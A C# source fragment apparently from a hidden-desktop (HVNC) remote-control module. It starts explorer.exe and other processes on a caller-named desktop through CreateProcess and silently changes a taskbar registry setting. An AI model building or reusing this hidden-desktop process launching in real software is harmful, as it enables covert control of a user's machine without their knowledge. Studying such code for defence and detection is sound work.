using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Hidden_handler
{
    class ProcessHandler
    {
        private string DesktopName;

        public ProcessHandler(string DesktopName)
        {
            this.DesktopName = DesktopName;
        }

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            int dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            ref PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public bool StartExplorer()
        {
            uint neverCombine = 2;
            string valueName = "TaskbarGlomLevel";
            string explorerKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(explorerKeyPath, true))
            {
                if (key != null)
                {
                    object value = key.GetValue(valueName);
                    if (value is uint regValue && regValue != neverCombine)
                    {
                        key.SetValue(valueName, neverCombine, RegistryValueKind.DWord);
                    }
                }
            }
            if (Utils.IsAdmin())
            {
                if (_ProcessHelper.RunAsRestrictedUser(@"C:\Windows\explorer.exe", DesktopName))
                {
                    return true;
                }
            }
            return CreateProc(@"C:\Windows\explorer.exe");
        }

        // Other methods...

        public bool CreateProc(string filePath)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = DesktopName;
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool resultCreateProcess = CreateProcess(
                null,
                filePath,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                48,
                IntPtr.Zero,
                null,
                ref si,
                ref pi);
            return resultCreateProcess;
        }
    }
}
